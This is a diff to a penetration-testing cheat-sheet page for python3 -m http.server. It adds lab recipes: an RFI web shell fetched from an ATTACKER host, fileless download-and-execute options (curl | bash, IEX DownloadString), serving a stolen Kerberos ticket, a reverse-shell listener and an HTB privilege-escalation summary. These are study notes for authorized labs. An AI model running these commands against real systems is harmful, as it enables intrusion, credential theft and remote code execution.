@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=http-server) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -23,8 +25,200 @@ Run from the folder containing the files to share.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=python3%20-m%20http.server)
+## Notebook recipes
 
-## Learning and original examples
+10 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="LFI → RCE">
+
+### LFI → RCE
+
+**File Inclusion: LFI and RFI Quick Reference**
+
+```bash
+# RFI (allow_url_include=On): host a payload and include it
+echo '<?php system($_GET[0]); ?>' > sh.php ; python3 -m http.server 80
+http://$IP/?page=http://ATTACKER/sh.php&0=id
+```
+
+</Accordion>
+
+<Accordion title="Quick Decision Tree">
+
+### Quick Decision Tree
+
+**File Transfers for Linux and Windows**
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+</Accordion>
+
+<Accordion title="Quick Web Servers (Serve Files from Target)">
+
+### Quick Web Servers (Serve Files from Target)
+
+**File Transfers for Linux and Windows**
+
+```bash
+python3 -m http.server                    # port 8000 default
+python2.7 -m SimpleHTTPServer             # Python 2 version
+php -S 0.0.0.0:8000                       # PHP built-in server
+ruby -run -ehttpd . -p8000                # Ruby built-in server
+```
+
+</Accordion>
+
+<Accordion title="Enumeration (post-foothold)">
+
+### Enumeration (post-foothold)
+
+**HTB Nibbles: Walkthrough and Report**
+
+```bash
+# Attacker
+python3 -m http.server 8080
+
+# Target
+wget http://10.10.14.174:8080/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+</Accordion>
+
+<Accordion title="6. Networking / pentest quick commands">
+
+### 6. Networking / pentest quick commands
+
+**Kali Terminal, tmux, zsh, and Vim**
+
+```bash
+ip a                # show interfaces & IPs (replaces ifconfig)
+ip a show tun0      # just the VPN interface (HTB/CPTS uses tun0)
+ip route            # routing table
+ss -tulpn           # listening ports (replaces netstat)
+ping -c 4 10.10.10.10
+curl -s http://target/ | less       # fetch a page
+curl -I http://target/               # headers only
+wget http://target/file              # download a file
+nc -lvnp 4444       # netcat listener (catch reverse shells)
+python3 -m http.server 80            # quick web server to transfer files
+```
+
+</Accordion>
+
+<Accordion title="Step 5 — Transfer the ticket from LINUX01 to Kali">
+
+### Step 5 — Transfer the ticket from LINUX01 to Kali
+
+**Pass the Ticket from Linux**
+
+```bash
+# [ON LINUX01, as root] copy to a clean dir and serve it
+mkdir /tmp/x && cp /tmp/krb5cc_647401106_8Dt6uj /tmp/x/ && cd /tmp/x
+python3 -m http.server 8080
+```
+
+**Pass the Ticket from Linux**
+
+Context from the notebook: Port mismatch:  the  python3 -m http.server &lt;port>  and the  wget `http://...:<port>`  must use the  same  port.
+
+```text
+python3 -m http.server <port>
+```
+
+</Accordion>
+
+<Accordion title="Mental Model — &quot;What Do I Use When?&quot;">
+
+### Mental Model — "What Do I Use When?"
+
+**Ports, Protocols, and Services by Purpose**
+
+```text
+"I found an open port"
+├── Is it a file share?    → SMB (445), NFS (2049), FTP (21)
+├── Is it remote access?   → SSH (22), RDP (3389), WinRM (5985)
+├── Is it a web server?    → HTTP (80/443) → fingerprint → fuzz
+├── Is it email?           → SMTP (25), IMAP (143), POP3 (110)
+├── Is it a database?      → MySQL (3306), MSSQL (1433), Oracle (1521)
+├── Is it monitoring?      → SNMP (161), IPMI (623)
+└── Not sure?              → nmap -sV -sC <IP> -p <port>
+
+"I need to get files off the target"
+├── Linux → scp/sftp (22)
+├── Windows → SMB (445) or evil-winrm download
+├── Web → wget/curl
+└── Simple → python3 -m http.server (on target)
+
+"I need to get files onto the target"
+├── Linux → scp/sftp (22) or wget from attacker
+├── Windows → SMB, certutil, PowerShell wget
+├── Web upload → if upload form exists
+└── Simple → python3 -m http.server (on attacker)
+
+"I need a shell"
+├── Linux → SSH (22)
+├── Windows → Evil-WinRM (5985), PsExec (445), RDP (3389)
+└── Either → reverse shell via exploit
+```
+
+</Accordion>
+
+<Accordion title="The essential toolset">
+
+### The essential toolset
+
+**Getting Started with Penetration Testing**
+
+Context from the notebook: Catch shells / transfer nc ,  python3 -m http.server  →  File Transfers Cheat Sheet
+
+```text
+python3 -m http.server
+```
+
+</Accordion>
+
+<Accordion title="Technical walkthrough">
+
+### Technical walkthrough
+
+**HTB Nibbles: Walkthrough and Report**
+
+Context from the notebook: Post-exploitation enumeration with  sudo -l  (cross-checked by  linpeas.sh , staged over an ad-hoc  python3 -m http.server 8080 ) revealed  nibbler  could run  /home/nibbler/personal/stuff/monitor.sh  as root without a password. After unzipping  personal.zip , the script was found to be writable by  nibbler . A reverse-shell payload was appended with  tee -a monitor.sh , a second listener opened on TCP/8443, and  sudo /home/nibbler/personal/stuff/monitor.sh  was executed — granting a root shell and  root.txt .
+
+```text
+python3 -m http.server 8080
+```
+
+</Accordion>
+
+</AccordionGroup>
